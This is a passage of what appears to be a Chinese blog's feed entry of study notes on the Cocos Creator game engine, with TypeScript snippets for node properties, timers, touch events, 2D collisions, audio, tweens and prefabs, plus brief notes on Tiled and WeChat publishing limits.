class_">GameRoot</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Component</span> &#123;</span><br><span class="line">    <span class="comment">// 加了@property的属性会在Inspector中显示，括号中表示类型。</span></span><br><span class="line">    <span class="meta">@property</span>(<span class="title class_">Node</span>) <span class="attr">button</span>:<span class="title class_">Node</span>;</span><br><span class="line">    <span class="comment">// 精灵框架数组</span></span><br><span class="line">    <span class="meta">@property</span>([<span class="title class_">SpriteFrame</span>]);</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@property</span>(<span class="title class_">CCInteger</span>) <span class="attr">HP</span>:<span class="title class_">Number</span>;</span><br><span class="line">    <span class="comment">// 私有属性加了也不会显示</span></span><br><span class="line">    <span class="meta">@property</span>(<span class="title class_">CCFloat</span>) <span class="attr">_MP</span>:<span class="title class_">Number</span>;</span><br><span class="line">    <span class="comment">// 不加不会显示</span></span><br><span class="line">    <span class="title class_">Exp</span>:<span class="title class_">Number</span>;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="title function_">start</span>(<span class="params"></span>) &#123;&#125;</span><br></pre></td></tr></table></figure><h3 id="3-组件操作"><a href="#3-组件操作" class="headerlink" title="3 组件操作"></a>3 组件操作</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取指定组件（name是组件名）</span></span><br><span class="line"><span class="keyword">const</span> comp = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getComponent</span>(name);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加子物体</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">comp</span>.<span class="title function_">addChild</span>(egg);</span><br></pre></td></tr></table></figure><h3 id="4-基础属性"><a href="#4-基础属性" class="headerlink" title="4 基础属性"></a>4 基础属性</h3><p>属性</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 位置</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>;</span><br><span class="line"><span class="comment">// 旋转（四元数）</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">rotation</span>;</span><br><span class="line"><span class="comment">// 缩放</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">scale</span>;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 使用三维向量要导入类</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Vec3</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获得坐标</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getPosition</span>(<span class="title class_">Vec3</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置坐标</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(x,y[,z]);</span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(<span class="keyword">new</span> <span class="title class_">Vec3</span>(x,y,z));</span><br><span class="line"></span><br><span class="line"><span class="comment">// 设置角度（2D）</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">angle</span> += <span class="number">1</span>;</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 不能按如下方式直接赋值坐标</span></span><br><span class="line"><span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">x</span> += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 可以按如下方式直接赋值坐标</span></span><br><span class="line"><span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="keyword">const</span> p = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>;</span><br><span class="line">    p.<span class="property">x</span> += <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span> = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 性能优化设置位置（防止多次new对象）</span></span><br><span class="line">curPos = <span class="keyword">new</span> <span class="title class_">Vec3</span>();</span><br><span class="line"><span class="title function_">update</span>(<span class="params">deltaTime: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getPosition</span>(<span class="variable language_">this</span>.<span class="property">curPos</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">curPos</span>.<span class="property">x</span> += <span class="number">100</span> * deltaTime;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(<span class="variable language_">this</span>.<span class="property">curPos</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-时间控制"><a href="#5-时间控制" class="headerlink" title="5 时间控制"></a>5 时间控制</h3><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 装载计时器</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">schedule</span>(func, interval);</span><br><span class="line"><span class="comment">// 卸载计时器</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="title function_">unschedule</span>(func);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载场景</span></span><br><span class="line">director.<span class="title function_">loadScene</span>(<span class="string">&quot;scene&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暂停游戏循环，包括渲染和更新逻辑。</span></span><br><span class="line">director.<span class="title function_">pause</span>();</span><br><span class="line"><span class="comment">// 恢复游戏</span></span><br><span class="line">director.<span class="title function_">resume</span>();</span><br><span class="line"><span class="comment">// 结束游戏</span></span><br><span class="line">director.<span class="title function_">end</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 暂停游戏逻辑更新，不会影响渲染</span></span><br><span class="line">game.<span class="title function_">pause</span>();</span><br><span class="line"><span class="comment">// 恢复游戏</span></span><br><span class="line">game.<span class="title function_">resume</span>();</span><br><span class="line"><span class="comment">// 结束游戏</span></span><br><span class="line">game.<span class="title function_">end</span>();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 更新计时器间隔时间</span></span><br><span class="line"><span class="title function_">startCreateEggs</span>(<span class="params">gap: <span class="built_in">number</span></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">unschedule</span>(<span class="variable language_">this</span>.<span class="property">startOneEgg</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">schedule</span>(<span class="variable language_">this</span>.<span class="property">startOneEgg</span>, gap);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按钮绑定重开游戏（游戏应该是用director.pause()暂停的）</span></span><br><span class="line"><span class="title function_">bindRestartEvent</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">restartButton</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_END</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        director.<span class="title function_">resume</span>();</span><br><span class="line">        director.<span class="title function_">loadScene</span>(<span class="string">&quot;scene&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 按钮绑定结束游戏</span></span><br><span class="line"><span class="title function_">bindExitEvent</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">exitButton</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_END</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        director.<span class="title function_">end</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-事件"><a href="#6-事件" class="headerlink" title="6 事件"></a>6 事件</h3><p>属性</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 鼠标按下时</span></span><br><span class="line"><span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_START</span></span><br><span class="line"><span class="comment">// 鼠标移动时</span></span><br><span class="line"><span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_MOVE</span></span><br><span class="line"><span class="comment">// 鼠标在控件内离开时</span></span><br><span class="line"><span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_END</span></span><br><span class="line"><span class="comment">// 鼠标在控件外离开时</span></span><br><span class="line"><span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_CANCEL</span></span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绑定事件</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">on</span>(event, func, <span class="variable language_">this</span>);</span><br><span class="line">input.<span class="title function_">on</span>(<span class="title class_">Input</span>.<span class="property">EventType</span>, func, <span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载事件</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">off</span>(event, func, <span class="variable language_">this</span>);</span><br><span class="line">input.<span class="title function_">off</span>(<span class="title class_">Input</span>.<span class="property">EventType</span>, func, <span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 项目元素实际位置</span></span><br><span class="line"><span class="keyword">const</span> uiPos = event.<span class="title function_">getLocation</span>();</span><br><span class="line"><span class="keyword">const</span> delta = event.<span class="title function_">getDelta</span>();</span><br><span class="line"><span class="keyword">const</span> dx = event.<span class="title function_">getDeltaX</span>();</span><br><span class="line"><span class="keyword">const</span> dy = event.<span class="title function_">getDeltaY</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 元素在UI上的位置</span></span><br><span class="line"><span class="keyword">const</span> uiPos = event.<span class="title function_">getUILocation</span>();</span><br><span class="line"><span class="keyword">const</span> delta = event.<span class="title function_">getUIDelta</span>();</span><br><span class="line"><span class="keyword">const</span> dx = delta.<span class="property">x</span>;</span><br><span class="line"><span class="keyword">const</span> dy = delta.<span class="property">y</span>;</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 绑定事件（EventTouch）</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">EventTouch</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_START</span>, <span class="variable language_">this</span>.<span class="property">onTouchStart</span>, <span class="variable language_">this</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_MOVE</span>, <span class="variable language_">this</span>.<span class="property">onTouchMove</span>, <span class="variable language_">this</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_END</span>, <span class="variable language_">this</span>.<span class="property">onTouchEnd</span>, <span class="variable language_">this</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">on</span>(<span class="title class_">Node</span>.<span class="property">EventType</span>.<span class="property">TOUCH_CANCEL</span>, <span class="variable language_">this</span>.<span class="property">onTouchCancel</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">onTouchStart</span>(<span class="params">event: EventTouch</span>) &#123;&#125;</span><br><span class="line"><span class="title function_">onTouchMove</span>(<span class="params">event: EventTouch</span>) &#123;&#125;</span><br><span class="line"><span class="title function_">onTouchEnd</span>(<span class="params">event: EventTouch</span>) &#123;&#125;</span><br><span class="line"><span class="title function_">onTouchCancel</span>(<span class="params">event: EventTouch</span>)&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 绑定事件（Input）</span></span><br><span class="line"><span class="keyword">import</span> &#123;<span class="title class_">Input</span>&#125; <span class="keyword">from</span> <span class="string">&#x27;cc&#x27;</span>;</span><br><span class="line"><span class="title function_">start</span>(<span class="params"></span>)&#123;</span><br><span class="line">    input.<span class="title function_">on</span>(<span class="title class_">Input</span>.<span class="property">EventType</span>.<span class="property">KEY_DOWN</span>, <span class="variable language_">this</span>.<span class="property">onKeyDown</span>, <span class="variable language_">this</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">onKeyDown</span>(<span class="params">event: EventKeyboard</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(event.<span class="property">keyCode</span> === <span class="title class_">KeyCode</span>.<span class="property">KEY_W</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击按钮</span></span><br><span class="line"><span class="title function_">onTouchStart</span>(<span class="params">event: EventTouch</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setScale</span>(<span class="number">0.9</span>,<span class="number">0.9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">onTouchEnd</span>(<span class="params">event: EventTouch</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setScale</span>(<span class="number">1.0</span>,<span class="number">1.0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 拖动物体</span></span><br><span class="line"><span class="title function_">onTouchMove</span>(<span class="params">event: EventTouch</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> x = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">x</span>;</span><br><span class="line">    <span class="keyword">const</span> y = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">y</span>;</span><br><span class="line">    <span class="keyword">const</span> delta = event.<span class="title function_">getUIDelta</span>();</span><br><span class="line">    <span class="keyword">const</span> dx = delta.<span class="property">x</span>;</span><br><span class="line">    <span class="keyword">const</span> dy = delta.<span class="property">y</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(x + dx,y + dy);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 点击物体左右移动</span></span><br><span class="line"><span class="title function_">onTouchStart</span>(<span class="params">event: EventTouch</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> uiPos = event.<span class="title function_">getUILocation</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> transform = <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">getComponent</span>(<span class="title class_">UITransform</span>);</span><br><span class="line">    <span class="keyword">const</span> nodePos = transform.<span class="title function_">convertToNodeSpaceAR</span>(<span class="keyword">new</span> <span class="title class_">Vec3</span>(uiPos.<span class="property">x</span>,uiPos.<span class="property">y</span>,<span class="number">0</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> dx = nodePos.<span class="property">x</span> &gt; <span class="number">0</span> ? <span class="number">50</span> : -<span class="number">50</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(<span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">x</span> + dx, <span class="variable language_">this</span>.<span class="property">node</span>.<span class="property">position</span>.<span class="property">y</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-物理碰撞"><a href="#7-物理碰撞" class="headerlink" title="7 物理碰撞"></a>7 物理碰撞</h3><blockquote><p><a href="https://docs.cocos.com/creator/manual/zh/physics-2d/physics-2d-system.html">official::2D 物理系统</a></p></blockquote><p>属性</p><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册单个碰撞体的回调函数</span></span><br><span class="line">collider.<span class="title function_">on</span>(<span class="title class_">Contact2DType</span>, func, <span class="variable language_">this</span>);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 注册全局碰撞回调函数</span></span><br><span class="line"><span class="title class_">PhysicsSystem2D</span>.<span class="property">instance</span>.<span class="title function_">on</span>(<span class="title class_">Contact2DType</span>, func, <span class="variable language_">this</span>);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 注册单个碰撞函数</span></span><br><span class="line"><span class="keyword">let</span> collider = <span class="variable language_">this</span>.<span class="title function_">getComponent</span>(<span class="title class_">Collider2D</span>);</span><br><span class="line"><span class="keyword">if</span> (collider) &#123; collider.<span class="title function_">on</span>(<span class="title class_">Contact2DType</span>.<span class="property">BEGIN_CONTACT</span>, <span class="variable language_">this</span>.<span class="property">onBeginContact</span>, <span class="variable language_">this</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">onBeginContact</span>(<span class="params">selfCollider: Collider2D, otherCollider: Collider2D, contact: IPhysics2DContact | <span class="literal">null</span></span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;onBeginContact&#x27;</span>); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 碰撞销毁（不要直接销毁）</span></span><br><span class="line"><span class="keyword">const</span> comp = <span class="variable language_">this</span>.<span class="property">player</span>.<span class="title function_">getComponent</span>(<span class="title class_">Collider2D</span>);</span><br><span class="line">comp.<span class="title function_">on</span>(<span class="title class_">Contact2DType</span>.<span class="property">BEGIN_CONTACT</span>, <span class="function">(<span class="params">selfCollider: Collider2D, otherCollider: Collider2D, contact: IPhysics2DContact | <span class="literal">null</span></span>) =&gt;</span> &#123;</span><br><span class="line">    director.<span class="title function_">once</span>(<span class="title class_">Director</span>.<span class="property">EVENT_AFTER_PHYSICS</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">        otherCollider.<span class="property">node</span>.<span class="title function_">destroy</span>();</span><br><span class="line">    &#125;, <span class="variable language_">this</span>);</span><br><span class="line">&#125;, <span class="variable language_">this</span>);</span><br></pre></td></tr></table></figure><h3 id="8-声音"><a href="#8-声音" class="headerlink" title="8 声音"></a>8 声音</h3><p>属性</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 声音片段</span></span><br><span class="line"><span class="meta">@property</span>(<span class="title class_">AudioClip</span>) <span class="attr">bgmClip</span>: <span class="title class_">AudioClip</span> = <span class="literal">null</span>;</span><br><span class="line"><span class="comment">// 声音资源</span></span><br><span class="line"><span class="attr">_audioSource</span>: <span class="title class_">AudioSource</span> = <span class="literal">null</span>;</span><br></pre></td></tr></table></figure><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 新建对象</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_audioSource</span> = <span class="keyword">new</span> <span class="title class_">AudioSource</span>();</span><br><span class="line"><span class="comment">// 绑定片段</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="property">clip</span> = <span class="variable language_">this</span>.<span class="property">bgmClip</span>;</span><br><span class="line"><span class="comment">// 声音大小</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="property">volume</span> = <span class="number">0.5</span>;</span><br><span class="line"><span class="comment">// 设置循环</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="property">loop</span> = <span class="literal">true</span>;</span><br><span class="line"><span class="comment">// 播放</span></span><br><span class="line"><span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="title function_">play</span>();</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 循环播放bgm</span></span><br><span class="line"><span class="title function_">initBgm</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">bgmClip</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_audioSource</span> = <span class="keyword">new</span> <span class="title class_">AudioSource</span>();</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="property">clip</span> = <span class="variable language_">this</span>.<span class="property">bgmClip</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="property">loop</span> = <span class="literal">true</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">_audioSource</span>.<span class="title function_">play</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-tween动画"><a href="#9-tween动画" class="headerlink" title="9 tween动画"></a>9 tween动画</h3><blockquote><p><a href="https://docs.cocos.com/creator/manual/zh/tween/">official::缓动系统</a></p></blockquote><p>方法</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 设定要改变的对象</span></span><br><span class="line"><span class="title function_">tween</span>(obj)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在上述代码后添加代码进行设定</span></span><br><span class="line"><span class="comment">// 添加标签</span></span><br><span class="line">.<span class="title function_">tag</span>(<span class="built_in">number</span>)</span><br><span class="line"><span class="comment">// 移动到</span></span><br><span class="line">.<span class="title function_">to</span>(time, vec3)</span><br><span class="line"><span class="comment">// 向该方向移动</span></span><br><span class="line">.<span class="title function_">by</span>(time, vec3)</span><br><span class="line"><span class="comment">// 将上述缓动动作打包成一个</span></span><br><span class="line">.<span class="title function_">union</span>()</span><br><span class="line"><span class="comment">// 永久重复</span></span><br><span class="line">.<span class="title function_">repeatForever</span>()</span><br><span class="line"><span class="comment">// 开始和结束</span></span><br><span class="line">.<span class="title function_">start</span>()</span><br><span class="line">.<span class="title function_">stop</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 停止所有缓动</span></span><br><span class="line"><span class="title class_">Tween</span>.<span class="title function_">stopAll</span>()</span><br><span class="line"><span class="comment">// 停止指定标签的缓动</span></span><br><span class="line"><span class="title class_">Tween</span>.<span class="title function_">stopAllByTag</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// 停止所有指定对象的缓动</span></span><br><span class="line"><span class="title class_">Tween</span>.<span class="title function_">stopAllByTarget</span>(<span class="variable language_">this</span>.<span class="property">node</span>);</span><br></pre></td></tr></table></figure><p>案例</p><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 自定义对象自定义属性自定义缓动曲线</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="attr">n</span>: <span class="number">0</span>;&#125;</span><br><span class="line"><span class="keyword">const</span> comp = <span class="variable language_">this</span>.<span class="property">labelNode</span>.<span class="title function_">getComponent</span>(<span class="title class_">Label</span>);</span><br><span class="line"><span class="title function_">tween</span>(obj)</span><br><span class="line">.<span class="title function_">to</span>(<span class="number">3</span>, &#123;<span class="attr">n</span>: <span class="number">1000</span>&#125;, &#123;</span><br><span class="line">    <span class="attr">onUpdate</span>: <span class="function">(<span class="params">target,ratio</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="comment">// 转换成两位小数后转换成字符串输出</span></span><br><span class="line">            comp.<span class="property">string</span> = <span class="string">`<span class="subst">$&#123;obj.n.toFixed(<span class="number">2</span>)&#125;</span>`</span>;</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="comment">// 自定义缓动曲线</span></span><br><span class="line">    <span class="attr">easing</span>: <span class="string">&#x27;elasticOut&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续跳跃</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;<span class="attr">y</span>: <span class="number">0</span>&#125;</span><br><span class="line"><span class="title function_">tween</span>(obj)</span><br><span class="line">.<span class="title function_">to</span>(<span class="number">0.5</span>, &#123;<span class="attr">n</span>: <span class="number">200</span>&#125;, &#123;</span><br><span class="line">    <span class="attr">onUpdate</span>: <span class="function">(<span class="params">target, ratio</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(<span class="number">0</span>, obj.<span class="property">y</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="attr">easing</span>: <span class="string">&#x27;quadOut&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line">.<span class="title function_">to</span>(<span class="number">0.5</span>, &#123;<span class="attr">n</span>: <span class="number">0</span>&#125;, &#123;</span><br><span class="line">    <span class="attr">onUpdate</span>: <span class="function">(<span class="params">target, ratio</span>) =&gt;</span> &#123;</span><br><span class="line">            <span class="variable language_">this</span>.<span class="property">node</span>.<span class="title function_">setPosition</span>(<span class="number">0</span>, obj.<span class="property">y</span>)</span><br><span class="line">        &#125;,</span><br><span class="line">    <span class="attr">easing</span>: <span class="string">&#x27;quadIn&#x27;</span></span><br><span class="line">&#125;)</span><br><span class="line"><span class="comment">// 将前面的动作整合</span></span><br><span class="line">.<span class="title function_">union</span>()</span><br><span class="line"><span class="comment">// 传递动作，不传则重复上一个动作（此处重复union）</span></span><br><span class="line">.<span class="title function_">repeatForever</span>()</span><br><span class="line">.<span class="title function_">start</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 异步翻牌</span></span><br><span class="line"><span class="title function_">makeCardTurn</span>(<span class="params">node, isBack, id?</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Promise</span>&lt;<span class="built_in">void</span>&gt;(<span class="function"><span class="params">resolve</span> =&gt;</span> &#123;</span><br><span class="line">    <span class="title function_">tween</span>(node)</span><br><span class="line">    .<span class="title function_">to</span>(<span class="number">0.3</span>, &#123;<span class="attr">scale</span>: <span class="keyword">new</span> <span class="title class_">Vec3</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>)&#125;)</span><br><span class="line">    .<span class="title function_">call</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> sprite = node.<span class="title function_">getComponent</span>(<span class="title class_">Sprite</span>);</span><br><span class="line">        sprite.<span class="property">spriteFrame</span> = isBack ? <span class="variable language_">this</span>.<span class="property">cardManager</span>.<span class="title function_">getCardBeiSF</span>() : <span class="variable language_">this</span>.<span class="property">cardManager</span>.<span class="title function_">getCardSFById</span>(id);</span><br><span class="line">    &#125;)</span><br><span class="line">        .<span class="title function_">to</span>(<span class="number">0.3</span>, &#123; <span class="attr">scale</span>: <span class="keyword">new</span> <span class="title class_">Vec3</span>(<span class="number">0.2</span> ,<span class="number">1</span> ,<span class="number">1</span>)&#125; )</span><br><span class="line">        .<span class="title function_">call</span>(<span class="function">() =&gt;</span> <span class="title function_">resolve</span>())</span><br><span class="line">        .<span class="title function_">start</span>();</span><br><span class="line">&#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-预制件"><a href="#10-预制件" class="headerlink" title="10 预制件"></a>10 预制件</h3><figure class="highlight typescript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 加载预制件</span></span><br><span class="line"><span class="keyword">const</span> fab = <span class="title function_">instantiate</span>(<span class="title class_">Prefab</span>);</span><br></pre></td></tr></table></figure><h2 id="七、辅助工具"><a href="#七、辅助工具" class="headerlink" title="七、辅助工具"></a>七、辅助工具</h2><h3 id="1-Tiled"><a href="#1-Tiled" class="headerlink" title="1 Tiled"></a>1 Tiled</h3><blockquote><p><a href="https://www.mapeditor.org/">official::Tiled</a></p><p>使用流程：</p><ol><li>新建项目——新建地图集——新建图层。</li></ol><p>Q1：[scene] cannot read property ‘vb’ of null</p><p>A1：项目——宏配置——BATCHER2D_MEM_INCREMENT改大点</p></blockquote><hr><h2 id="八、常见问题"><a href="#八、常见问题" class="headerlink" title="八、常见问题"></a>八、常见问题</h2><hr><h2 id="九、发行"><a href="#九、发行" class="headerlink" title="九、发行"></a>九、发行</h2><h3 id="1-微信环境"><a href="#1-微信环境" class="headerlink" title="1 微信环境"></a>1 微信环境</h3><blockquote><p>微信环境对ES6的安全考虑：</p><ul><li>不支持使用<code>eval</code>执行JS代码</li><li>不支持使用<code>new Function</code>创建函数</li></ul></blockquote><h3 id="2-打包"><a href="#2-打包" class="headerlink" title="2 打包"></a>2 打包</h3><blockquote><p>打包</p></blockquote><h2 id="遗留问题"><a href="#遗留问题" class="headerlink" title="遗留问题"></a>遗留问题</h2><blockquote><ol><li>全局回调函数</li><li><code>Trigger.</code>，触发器和碰撞</li><li>异步</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> 游戏程序 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 概述 </tag>
            
            <tag> 游戏引擎 </tag>
            
            <tag> Cocos </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>星火编辑器</title>
      <link href="/posts/1362c546.html"/>
      <url>/posts/1362c546.html</url>
      
